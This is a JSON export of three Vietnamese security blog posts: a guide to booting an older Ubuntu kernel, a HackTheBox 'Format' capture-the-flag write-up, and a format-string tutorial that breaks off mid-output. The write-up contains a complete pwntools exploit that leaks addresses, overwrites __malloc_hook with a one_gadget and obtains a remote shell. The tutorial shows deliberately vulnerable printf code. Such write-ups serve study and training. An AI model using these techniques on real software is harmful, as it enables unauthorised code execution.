[{"content":"Mở đầu Cũng một thời gian khá lâu rồi tôi không còn viết blog nữa. Phần lớn vì tôi tập trung học các kiến thức mới. Tuy nhiên sau một thời gian nghiên cứu, tôi lại phát hiện ra viết blog là cách để tôi lưu giữ và hiểu kiến thức sâu hơn. Đồng thời, được sự khuyến khích từ mentor, tôi sẽ quay lại với thói quen viết blog này, chia sẻ, lưu trữ lại các kiến thức mình đã học!\nMột trong những vấn đề hay gặp của các bạn nghiên cứu về Kernel Exploitation là phải boot lại các phiên bản kernel cũ hơn phiên bản đang có hiện tại. Lúc mới bắt đầu, tôi đã tốn rất nhiều thời gian cho phần cài đặt này. Bài viết này tôi sẽ chỉa sẻ kinh nghiệm của tôi trong việc xây dựng boot lại 1 phiên bản kernel cũ để phục vụ quá trình nghiên cứu.\nNội dung chính Context Ngữ cảnh: Phiên bản hiện tại: 5.15.0-52-generic mục tiêu: cài kernel version 5.11 Các bước thực hiện Vào website Index of /~kernel-ppa/mainline (ubuntu.com) và chọn phiên bản mình muốn cài Tải các file có định dạng 1 2 3 4 5 6 linux-headers-xxxxxx-generic-xxxxxx_amd64.deb linux-headers-xxxxxx_all.deb linux-image-xxxxxx-generic-xxxxxx_amd64.deb linux-modules-xxxxxx-generic-xxxxxx_amd64.deb Cài đặt tất cả các file tải về 1 sudo dpkg -i *deb Khởi động lại máy. Trong trường hợp chưa được như phiên bản mong muốn, chúng ta làm tiếp các bước sau Chạy câu lệnh sau để liệt kê tất cả các phiên bản kernel hiện đang có 1 awk \u0026#39;/menuentry/ \u0026amp;\u0026amp; /class/ {count++; print count-1\u0026#34;****\u0026#34;$0 }\u0026#39; /boot/grub/grub.cfg kiểm tra chỉ số index ở đầu dòng. Linux kernel 5.11 đang ở index 5. Sau đó, chúng ta thay đổi giá trị GRUB_DEFAULT trong file /etc/default/grub như sau: Ỏ đây 1-4 là trước index 5\nSau đó, ta update grub 1 sudo update-grub khởi động lại máy 1 reboot sau khi khởi động lại, chúng ta kiểm tra, sẽ được phiên bản kernel như mong muốn Khá đơn giản cho những người đã biết :)) Chúc các bạn cài đặt thành công! ","description":"Một trong những vấn đề hay gặp của các bạn nghiên cứu về Kernel Exploitation là phải boot lại các phiên bản kernel cũ hơn phiên bản đang có hiện tại. Bài viết này tôi sẽ chỉa sẻ kinh nghiệm của tôi trong việc xây dựng boot lại 1 phiên bản kernel cũ để phục vụ quá trình nghiên cứu","id":0,"section":"posts","tags":["kernel"],"title":"How to boot with an old kernel version in Ubuntu","uri":"https://minhlongmt183.github.io/posts/boot_old_kernel_ubuntu/"},{"content":"Bước 1 - Phân tích Đầu tiên, chúng ta kiểm tra checksec của tệp tin 1 2 3 4 5 6 7 ➜ Format git:(main) ✗ checksec format [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Dễ dàng thấy hầu hết các cơ chế bảo mật đều được bật ở trên tệp tin này. Tựa đề là format, nên ta dễ dàng biết được đây thuộc loại lỗi format-string 1 2 3 ➜ Format git:(main) ✗ ./format %x.%x.%x.%x f0623a03.0.f0549142.3a1b8000 Ta mở bằng ghidra: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 undefined8 main(EVP_PKEY_CTX *param_1) { long lVar1; long in_FS_OFFSET; lVar1 = *(long *)(in_FS_OFFSET + 0x28); init(param_1); echo(); if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 void echo(void) { long in_FS_OFFSET; char local_118 [264]; undefined8 local_10; local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28); do { fgets(local_118,0x100,stdin); printf(local_118); } while( true ); } Lỗi này cho phép chúng ta đọc được dữ liệu trên stack. Mở trên gdb, đặt breakpoint tại printf của hàn echo. Chạy, nhập input và dùng lệnh x/100gx $rsp để in ra dữ liệu trên stack và quan sát. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 pwndbg\u0026gt; x/100gx $rsp 0x7fffffffdc10:\t0x4141414141414141\t0x4141414141414141 0x7fffffffdc20:\t0x0000000a61414141\t0x0000038000000380 0x7fffffffdc30:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc40:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc50:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc60:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc70:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc80:\t0x0000000000000000\t0x00007ffff7fa85c0 0x7fffffffdc90:\t0x0000000000000000\t0x00007ffff7e516a5 0x7fffffffdca0:\t0x0000000000000000\t0x00007ffff7fa85c0 0x7fffffffdcb0:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdcc0:\t0x00007ffff7fa94a0\t0x00007ffff7e4d6bd 0x7fffffffdcd0:\t0x00007ffff7fa85c0\t0x00007ffff7e43f65 0x7fffffffdce0:\t0x00005555555552d0\t0x00007fffffffdd20 0x7fffffffdcf0:\t0x00005555555550c0\t0x00007fffffffde30 0x7fffffffdd00:\t0x0000000000000000\t0x000055555555526d 0x7fffffffdd10:\t0x00007ffff7facfc8\t0xc53e05bd2bae9300 0x7fffffffdd20:\t0x00007fffffffdd40\t0x00005555555552b3 0x7fffffffdd30:\t0x00007fffffffde30\t0xc53e05bd2bae9300 0x7fffffffdd40:\t0x0000000000000000\t0x00007ffff7de30b3 0x7fffffffdd50:\t0x00007ffff7ffc620\t0x00007fffffffde38 0x7fffffffdd60:\t0x0000000100000000\t0x0000555555555284 0x7fffffffdd70:\t0x00005555555552d0\t0xbca385af5106ab45 0x7fffffffdd80:\t0x00005555555550c0\t0x00007fffffffde30 0x7fffffffdd90:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdda0:\t0x435c7a50eba6ab45\t0x435c6a1331c8ab45 0x7fffffffddb0:\t0x0000000000000000\t0x0000000000000000 0x7fffffffddc0:\t0x0000000000000000\t0x0000000000000001 0x7fffffffddd0:\t0x00007fffffffde38\t0x00007fffffffde48 0x7fffffffdde0:\t0x00007ffff7ffe190\t0x0000000000000000 0x7fffffffddf0:\t0x0000000000000000\t0x00005555555550c0 0x7fffffffde00:\t0x00007fffffffde30\t0x0000000000000000 0x7fffffffde10:\t0x0000000000000000\t0x00005555555550ee 0x7fffffffde20:\t0x00007fffffffde28\t0x000000000000001c 0x7fffffffde30:\t0x0000000000000001\t0x00007fffffffe1be 0x7fffffffde40:\t0x0000000000000000\t0x00007fffffffe1fa 0x7fffffffde50:\t0x00007fffffffe206\t0x00007fffffffe214 0x7fffffffde60:\t0x00007fffffffe227\t0x00007fffffffe23c 0x7fffffffde70:\t0x00007fffffffe244\t0x00007fffffffe256 0x7fffffffde80:\t0x00007fffffffe292\t0x00007fffffffe29a 0x7fffffffde90:\t0x00007fffffffe2b1\t0x00007fffffffe2cd 0x7fffffffdea0:\t0x00007fffffffe2ed\t0x00007fffffffe309 0x7fffffffdeb0:\t0x00007fffffffe329\t0x00007fffffffe334 0x7fffffffdec0:\t0x00007fffffffe344\t0x00007fffffffe356 0x7fffffffded0:\t0x00007fffffffe3b2\t0x00007fffffffe3d0 0x7fffffffdee0:\t0x00007fffffffe3e4\t0x00007fffffffe41a 0x7fffffffdef0:\t0x00007fffffffe42c\t0x00007fffffffe43b 0x7fffffffdf00:\t0x00007fffffffe479\t0x00007fffffffe490 0x7fffffffdf10:\t0x00007fffffffe4c3\t0x00007fffffffe4da 0x7fffffffdf20:\t0x00007fffffffe4ea\t0x00007fffffffe4fe Chúng ta thấy có 1 vài giá trị có địa chỉ là 0x5555*** trên stack. Kiểm tra các giá trị này với lệnh x/i dia_chi 1 2 3 4 5 6 7 8 9 10 pwndbg\u0026gt; x/i 0x00005555555552d0 0x5555555552d0 \u0026lt;__libc_csu_init\u0026gt;:\tendbr64 pwndbg\u0026gt; x/i 0x00005555555550c0 0x5555555550c0 \u0026lt;_start\u0026gt;:\tendbr64 pwndbg\u0026gt; x/i 0x000055555555526d 0x55555555526d \u0026lt;init+117\u0026gt;:\tnop pwndbg\u0026gt; x/i 0x00005555555552b3 0x5555555552b3 \u0026lt;main+47\u0026gt;:\tmov eax,0x0 pwndbg\u0026gt; x/i 0x00005555555550ee 0x5555555550ee \u0026lt;_start+46\u0026gt;:\thlt Mặt khác, lỗi format-string có thể cho phép chúng ta dump dữ liệu trên stack. Chúng ta sẽ viết 1 đoạn code nhỏ để dump dữ liệu từ stack ra. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 from pwn import * # HOST = \u0026#39;64.227.36.245\u0026#39; # PORT = 30730 context.clear(arch=\u0026#34;amd64\u0026#34;) # ----------------------- def com(payload, wait=True): global r r.sendline(payload) if (wait): return r.recv() def nonStopLeak(): data = [] min_val = 1 max_val = 50 log.progress(\u0026#34;Starting nonStopLeaking (range: %d to %d)...\u0026#34; % (min_val, max_val)) data.append(\u0026#34;EMPTY ON PURPOSE\u0026#34;) for i in range(min_val, max_val): leak = \u0026#34;%{}$lx\u0026#34;.format(i) leak = com(leak).strip().decode() data.append(leak) log.success(\u0026#34;nonStopLeaking finalized...\u0026#34;) return data # -------------- exploit ----------------------- elf = ELF(\u0026#34;format\u0026#34;) r = process(\u0026#34;./format\u0026#34;) # input(\u0026#34;[+] attach gdb\u0026#34;) # Launch the fmtstr exploiter exploiter = FmtStr(com) collected_data = nonStopLeak() print(collected_data) r.interactive() Tiến hành chạy, ta được kết quả: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ➜ Format git:(main) ✗ python3 exploit.py [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./format\u0026#39;: pid 13390 [+] attach gdb [*] Found format string offset: 6 [▆] Starting nonStopLeaking (range: 1 to 40)... exploit.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes r.sendline(payload) [+] nonStopLeaking finalized... [\u0026#39;EMPTY ON PURPOSE\u0026#39;, \u0026#39;7f2bcf7e9a03\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf70f142\u0026#39;, \u0026#39;7fff990a1ad0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;61000a786c243625\u0026#39;, \u0026#39;6161616461616163\u0026#39;, \u0026#39;5241545361616165\u0026#39;, \u0026#39;444e457024362554\u0026#39;, \u0026#39;3800000000a\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf7ea5c0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf6936a5\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf7ea5c0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf7eb4a0\u0026#39;, \u0026#39;7f2bcf68f6bd\u0026#39;, \u0026#39;7f2bcf7ea5c0\u0026#39;, \u0026#39;7f2bcf685f65\u0026#39;, \u0026#39;55ddf1fb92d0\u0026#39;, \u0026#39;7fff990a1be0\u0026#39;, \u0026#39;55ddf1fb90c0\u0026#39;, \u0026#39;7fff990a1cf0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;55ddf1fb926d\u0026#39;, \u0026#39;7f2bcf7eefc8\u0026#39;, \u0026#39;cdd017be270afb00\u0026#39;] [*] Switching to interactive mode Tại đây, mình thấy có giá trị 0x55ddf1fb926d là địa chỉ tại vị trí init+117, mình sẽ dùng giá trị này để tính base address, bypass cơ chế ASLR và giá trị này nó nằm ở bye thứ 37. 1 2 3 4 ➜ Format git:(main) ✗ ./format ➜ Format git:(main) ✗ ./format %37$p 0x56406ae4f26d Do cơ chế ASLR nên giá trị này sẽ khác ở mỗi lần chạy. Bước thứ nhất, chúng ta sẽ vượt qua được cơ chế ASLR với đoạn code sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 from pwn import * # HOST = \u0026#39;64.227.36.245\u0026#39; # PORT = 30730 context.clear(arch=\u0026#34;amd64\u0026#34;) # ----------------------- def com(payload, wait=True): global r r.sendline(payload) if (wait): return r.recv() def nonStopLeak(): data = [] min_val = 1 max_val = 40 log.progress(\u0026#34;Starting nonStopLeaking (range: %d to %d)...\u0026#34; % (min_val, max_val)) data.append(\u0026#34;EMPTY ON PURPOSE\u0026#34;) for i in range(min_val, max_val): leak = \u0026#34;%{}$lx\u0026#34;.format(i) leak = com(leak).strip().decode() data.append(leak) log.success(\u0026#34;nonStopLeaking finalized...\u0026#34;) return data # -------------- exploit ----------------------- elf = ELF(\u0026#34;./format\u0026#34;) init_117 = 0x126d r = process(\u0026#34;./format\u0026#34;) input(\u0026#34;[+] attach gdb\u0026#34;) payload = b\u0026#39;%37$p\u0026#39; r.sendline(payload) init_leak = r.recvline() log.success(\u0026#34;LEAK : init+117 address: {}\u0026#34;.format(init_leak)) base_elf = int(init_leak,16) - 0x126d log.info(\u0026#34;Base ELF address: {}\u0026#34;.format(hex(base_elf))) elf.address = base_elf Bước 2: Leak địa chỉ __printf từ libc thông qua printf() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 pwndbg\u0026gt; disassemble echo Dump of assembler code for function echo: 0x0000559e0bc191a9 \u0026lt;+0\u0026gt;:\tendbr64 0x0000559e0bc191ad \u0026lt;+4\u0026gt;:\tpush rbp 0x0000559e0bc191ae \u0026lt;+5\u0026gt;:\tmov rbp,rsp 0x0000559e0bc191b1 \u0026lt;+8\u0026gt;:\tsub rsp,0x110 0x0000559e0bc191b8 \u0026lt;+15\u0026gt;:\tmov rax,QWORD PTR fs:0x28 0x0000559e0bc191c1 \u0026lt;+24\u0026gt;:\tmov QWORD PTR [rbp-0x8],rax 0x0000559e0bc191c5 \u0026lt;+28\u0026gt;:\txor eax,eax 0x0000559e0bc191c7 \u0026lt;+30\u0026gt;:\tmov rdx,QWORD PTR [rip+0x2e62] # 0x559e0bc1c030 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x0000559e0bc191ce \u0026lt;+37\u0026gt;:\tlea rax,[rbp-0x110] 0x0000559e0bc191d5 \u0026lt;+44\u0026gt;:\tmov esi,0x100 0x0000559e0bc191da \u0026lt;+49\u0026gt;:\tmov rdi,rax 0x0000559e0bc191dd \u0026lt;+52\u0026gt;:\tcall 0x559e0bc190a0 \u0026lt;fgets@plt\u0026gt; 0x0000559e0bc191e2 \u0026lt;+57\u0026gt;:\tlea rax,[rbp-0x110] 0x0000559e0bc191e9 \u0026lt;+64\u0026gt;:\tmov rdi,rax 0x0000559e0bc191ec \u0026lt;+67\u0026gt;:\tmov eax,0x0 0x0000559e0bc191f1 \u0026lt;+72\u0026gt;:\tcall 0x559e0bc19090 \u0026lt;printf@plt\u0026gt; 0x0000559e0bc191f6 \u0026lt;+77\u0026gt;:\tjmp 0x559e0bc191c7 \u0026lt;echo+30\u0026gt; End of assembler dump. pwndbg\u0026gt; disassemble 0x559e0bc19090 Dump of assembler code for function printf@plt: 0x0000559e0bc19090 \u0026lt;+0\u0026gt;:\tendbr64 0x0000559e0bc19094 \u0026lt;+4\u0026gt;:\tbnd jmp QWORD PTR [rip+0x2f25] # 0x559e0bc1bfc0 \u0026lt;printf@got.plt\u0026gt; 0x0000559e0bc1909b \u0026lt;+11\u0026gt;:\tnop DWORD PTR [rax+rax*1+0x0] End of assembler dump. pwndbg\u0026gt; Chúng ta sử dụng %s thay vì %p bởi vì %s sẽ đọc địa giá trị bên trong vùng nhớ được truyền vào printf và in ra cho đến khi gặp giá trị null. Điều đó có nghĩa nếu địa chỉ của vùng GOT được đưa vào thì chúng ta có thể in nó sẽ in ra địa chỉ của libc đang chứa trong nó. Cụ thể chúng ta sẽ thực hiện như sau: 1 2 3 4 5 6 7 8 9 ... # ------------- Leaking _printf address through printf() printf_got_ptl = elf.got[\u0026#34;printf\u0026#34;] log.info(\u0026#34;printf@got.plt address: {}\u0026#34;.format(hex(printf_got_ptl))) r.sendline(b\u0026#39;AAAA%7$s\u0026#39; + p64(printf_got_ptl)) printf_leak = r.recv() printf_libc = u64(printf_leak[4:10].ljust(8, b\u0026#39;\\x00\u0026#39;)) log.success(\u0026#34;Leaked __printf: {}\u0026#34;.format(hex(printf_libc))) ... Chúng ta lấy địa chỉ printf@plt thông qua lệnh elf.got[\u0026quot;printf\u0026quot;], sau đó gửi payload có dạng \u0026quot;AAAA%7$s\u0026quot; + p64(printf_got_ptl). Số 7 ở đây là vì địa chỉ của got p64(printf_got_ptl) năm ở vị trí thứ 7 trên stack, do đó %7s sẽ lấy địa chỉ này ra và in giá trị chứa trong nó cũng chính là địa chỉ libc. Lệnh ljust(8, \u0026quot;\\x00\u0026quot;) được dùng để thêm các gía trị \\x00 vì cơ chế align 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ➜ Format git:(main) ✗ python3 exploit.py [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./format\u0026#39;: pid 15866 [+] attach gdb [+] LEAK : init+117 address: b\u0026#39;0x563d767e026d\\n\u0026#39; [*] Base ELF address: 0x563d767df000 [*] printf@got.plt address: 0x563d767e2fc0 [+] Leaked __printf: 0x7fc6d53d6e10 [*] Stopped process \u0026#39;./format\u0026#39; (pid 15866) Sử dụng libc.blukat.me và địa chỉ của libc vừa có được để kiểm tra phiên bản của libc. Bước 3 chiếm quyền điều khiển Khi kiểm tra với checksec, chúng ta thấy rằng binary được setup với Full RELRO, điều đó có nghĩa chúng ta không thể ghi đè lên GOT, tuy nhiên nội dung của thư viện libc chúng ta vẫn có thể ghi đực. Do đó, mục tiêu sẽ ghi đè lên con trỏ __malloc_hook Khi chúng ta gửi vào printf() chuỗi quá lớn, __malloc_hook được gọi bất cứ khi nào malloc() được dùng. Chúng ta gọi malloc() bằng cách gọi printf(\u0026quot;%100000$c\u0026quot;), lệnh gọi này sẽ cấp phát nhiều byte trên stack và buộc libc phải cấp phát thêm vùng nhớ trên heap thay vì trên stack. Khi đó, chúng ta có thể ghi đè giá trị của __malloc_hook bằng %6n và thay AAAA đầu thành địa chỉ của __malloc_hook. Chúng ta sử dụng kĩ thuật one_gadget để thực thi execve(\u0026quot;/bin/sh\u0026quot;) trong libc. 1 2 3 4 5 6 7 8 9 10 11 12 13 ➜ Format git:(main) ✗ one_gadget libc6_2.27-3ubuntu1_amd64.so 0x4f2c5 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) constraints: rsp \u0026amp; 0xf == 0 rcx == NULL 0x4f322 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a38c execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL Tiếp theo, chúng ta tính các địa chỉ cần thiết. Với libc khi chưa chạy, chúng ta đọc địa chỉ của printf: 1 2 ➜ Format git:(main) ✗ objdump -TR libc6_2.27-3ubuntu1_amd64.so| grep \u0026#34; printf$\u0026#34; 0000000000064e80 g DF .text 00000000000000c3 GLIBC_2.2.5 printf Chúng ta thấy rằng khoảng cách từ printf tới base address là 0x64e80, do đó, để tính base address, chúng ta lấy địa chỉ của printf leak được khi thực thi trừ đi 0x64e80.\nSau khi có được base address, chúng ta tính địa chỉ của malloc_hook_addr và one_gadget bằng cách lấy base address cộng với khoảng cách của các hàm (lấy bằng cách đọc static) 1 2 3 4 # Calculating base libc, __malloc_hook and one_gadget --- base_libc = printf_libc - 0x64e80 malloc_hook_addr = base_libc + 0x00000000003ebc30 one_gadget = base_libc + 0x4f322 Ta sử dụng pwnlib.fmtstr - công cụ khai thác lỗi format string để tính và ghi đè địa chỉ __malloc_hook với one gadget và kích hoạt nó. 1 2 3 4 5 6 # Overriding __malloc_hook with one_gadget --- p.sendline(fmtstr_payload(6, {malloc_hook_addr: one_gadget})) p.recv() p.sendline(\u0026#39;%100000$c\u0026#39;) # __malloc_hook trigger p.interactive() p.close() Bước 4 - Chạy mã khai thác Chạy mã khai thác, ta có được 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ➜ Format git:(main) ✗ python3 exploit.py [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 167.99.202.131 on port 32399: Done [+] LEAK : init+117 address: b\u0026#39;0x55afb922b26d\\n\u0026#39; [*] Base ELF address: 0x55afb922a000 [*] printf@got.plt address: 0x55afb922dfc0 [+] Leaked __printf: 0x7f6b96c3be80 exploit.py:65: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes r.sendline(\u0026#39;%100000$c\u0026#39;) # __malloc_hook trigger [*] trigged malloc_hook [*] Switching to interactive mode $ ls flag.txt format run_challenge.sh $ cat flag.txt HTB{mall0c_h00k_f0r_th3_w1n!} $ [*] Interrupted [*] Closed connection to 167.99.202.131 port 32399 ➜ Format git:(main) ✗ Mã khai thác: exploit.py Nguồn tham khảo https://karol-mazurek95.medium.com/pwn-format-challenge-htb-3a7e6351ff3a https://github.com/luisrodrigues154/Cyber-Security/blob/master/HackTheBox/Challenges/Pwn/Format/notes.md ","description":"Can you hear the echo? ","id":1,"section":"posts","tags":["exploitation"],"title":"Hackthebox- Format","uri":"https://minhlongmt183.github.io/posts/htb_format/"},{"content":"Mở đầu Khai thác lỗi format string là một kĩ thuật cho phép chúng ta chiếm quyền kiểm soát của mộ chương trình đặc quyền. Giống như buffer overflow, format string cũng phụ thuộc vào lỗi khi lập trình, những lỗi này khi nhìn sơ qua thì không thấy có ảnh hưởng gì đến chương trình.\nNội dung chính Format Paraameters 1 function sử dụng định dạng chuỗi, như là prrintf(), chỉ cần xem xét định dạng được truyền vào nó và thực hiện những hoạt động đặc biệt mỗi khi gặp phải tham số truyền vào. Mỗi tham số định dạng chuỗi thì tương ứng với một tham số truyền vào, ví dụ chuỗi chúng ta sử dụng 4 tham số định dạng thì cần phải truyền 4 biến tương ưng. Những dạng định dạng tham số thường gặp: Parameter Input Type Output Type %d Value Decimal %u Value Unsigned decimal %x Value Hexadecimal %s Pointer String %n Pointer Number of bytes written so far Chúng ta sẽ thử với chương trình sau: fmt_uncommon.c\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { int A = 5, B = 7, count_one, count_two; // Example of a %n format string printf(\u0026#34;The number of bytes written up to this point X%n is being stored in count_one, and the number of bytes up to here X%n is being stored in count_two.\\n\u0026#34;, \u0026amp;count_one, \u0026amp;count_two); printf(\u0026#34;count_one: %d\\n\u0026#34;, count_one); printf(\u0026#34;count_two: %d\\n\u0026#34;, count_two); // Stack example printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B); exit(0); } Chương trình sử dụng định dạng %n trong hàm printf(). Chúng ta chạy và xem output như thế nào. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ➜ fmt git:(main) ✗ gcc fmt_uncommon.c fmt_uncommon.c: In function ‘main’: fmt_uncommon.c:14:34: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 3 has type ‘int *’ [-Wformat=] 14 | printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B); | ~~~^ ~~ | | | | unsigned int int * | %08ls ➜ fmt git:(main) ✗ ./a.out The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two. count_one: 46 count_two: 113 A is 5 and is at c6658b68. B is 7. ➜ fmt git:(main) ✗ %n là định dạng duy nhất dùng để ghi dữ liệu thay vì hiển thị dữ liệu. Khi hàm định dạng gặp tham số %n, nó sẽ viết tổng số byte mà nó đã được viết bởi hàm vào địa chỉ tương ứng của biến. Ví dụ với hàm fmt_common trên, A có giá trị là 46 bởi vì tổng số byte mà hàm printf đã in ra cho tới khi gặp %n là 46 kí tự: 1 2 3 \u0026gt;\u0026gt;\u0026gt; la = \u0026#34;The number of bytes written up to this point X\u0026#34; \u0026gt;\u0026gt;\u0026gt; len(la) 46 Xem xét câu lệnh sau: 1 printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B); Khi hàm printf() được gọi, các tham số được dưa vào stack theo thứ tự ngược lại: Top of the Stack Address of format string Value of A Address of A Value of B Bottom of the Stack Hàm printf sẽ đi qua từng kí tự một, nếu kí tự không bắt đầu bằng một format-parameter, kí tự này sẽ được copy ra output. Nếu một format-parameter được gặp, nó sẽ lấy giá trị của đối số trong stack tương ứng với parameter. Trong trường hợp số argeument trong stack ít hơn số format-parameter trong string thì điều gì sẽ xảy ra? Ví dụ: 1 printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A); Ta sẽ tiến hành thay đổi 1 tí ở chương trình fmt_uncommon2.c 1 2 3 4 5 6 7 ➜ fmt git:(main) ✗ sed -e \u0026#39;s/, B)/)/\u0026#39; fmt_uncommon.c \u0026gt; fmt_uncommon2.c ➜ fmt git:(main) ✗ diff fmt_uncommon.c fmt_uncommon2.c 14c14 \u0026lt; printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B); --- \u0026gt; printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A); ➜ fmt git:(main) ✗ Compile và chạy, xem kết quả: 1 2 3 4 5 6 ➜ fmt git:(main) ✗ gcc -o fmt_uncommon2 fmt_uncommon2.c -w ➜ fmt git:(main) ✗ ./fmt_uncommon2 The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two. count_one: 46 count_two: 113 A is 5 and is at 74f2e9b8. B is 0. Chúng ta dùng -w để tắt đi những warning từ compiler. Khi chạy, ta thấy B lúc bây giờ có giá trị là 0. Tại sao B lại có giá trị là 0 trong khi giá trị khởi tạo của B là 7? Ta đã biết rằng, khi hàm printf() gọi, nó sẽ đẩy các đối số vào trong stack và khi gặp format-parameter, nó sẽ vào stack và lấy giá trị này ra. Tuy nhiên, trong trường hợp này, số format-parameter lại nhiều hơn argument, nên đến tham số thứ 3, hàm printf cũng vào stack để lấy giá trị tại vị trí thứ 3 trên stack. 0 là giá trị đầu tiên mà hàm printf tìm thấy trên stack. The Format String Vulnerability Đôi khi programmer sử dụng printf(string) thay vì printf(\u0026quot;%s\u0026quot;, string). Lúc này, hàm printf sẽ nhận trực tiếp địa chỉ của string và in từng kí tự trong string đó. Đoạn code sau thể hiện hoạt động của 2 cách sử dụng này. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char *argv[]) { char text[1024]; static int test_val = -72; if (argc \u0026lt; 2) { printf(\u0026#34;Usage: %s \u0026lt;text to print\u0026gt;\\n\u0026#34;, argv[0]); exit(0); } strcpy(text. argv[1]); printf(\u0026#34;The right way to print user-controlled input:\\n\u0026#34;); printf(\u0026#34;%s\u0026#34;, text); printf(\u0026#34;\\n The wrong way to print user-controlled input:\\n\u0026#34;); printf(text); printf(\u0026#34;\\n\u0026#34;); // Debug output printf(\u0026#34;[*] test_val @ 0x%08x = %d 0x%08x\\n\u0026#34;, \u0026amp;test_val, test_val, test_val); exit(0); } Tiến hành biên dịch và xem kết quả: 1 2 3 4 5 6 7 ➜ fmt git:(main) ✗ gcc -o fmt_vuln fmt_vuln.c -w ➜ fmt git:(main) ✗ ./fmt_vuln hello_world The right way to print user-controlled input: hello_world The wrong way to print user-controlled input: hello_world [*] test_val @ 0x8a756010 = -72 0xffffffb8 Với input là hello_world, cả 2 cách đều hoạt động tốt. Tuy nhiên, nếu input nhập vào chứa format parameter liệu cả 2 có như nhau hay không? 1 2 3 4 5 6 ➜ fmt git:(main) ✗ ./fmt_vuln hello_world%x The right way to print user-controlled input: hello_world%x The wrong way to print user-controlled input: hello_world128012a0 [*] test_val @ 0x10ff0010 = -72 0xffffffb8 Từ output trên ta thấy, với cách dùng thứ 2, giá trị trên stack đã được in ra. Với mỗi tham số %x được sủ dụng, 4 bytes trên stack sẽ được in ra. Do đó, nếu lặp lại quá trình này, chúng ta có thể lấy toàn bộ dữ liệu trên stack. 1 2 3 4 5 6 ➜ fmt git:(main) ✗ ./fmt_vuln $(perl -e \u0026#39;print \u0026#34;%08x.\u0026#34;x40\u0026#39;) The right way to print user-controlled input: 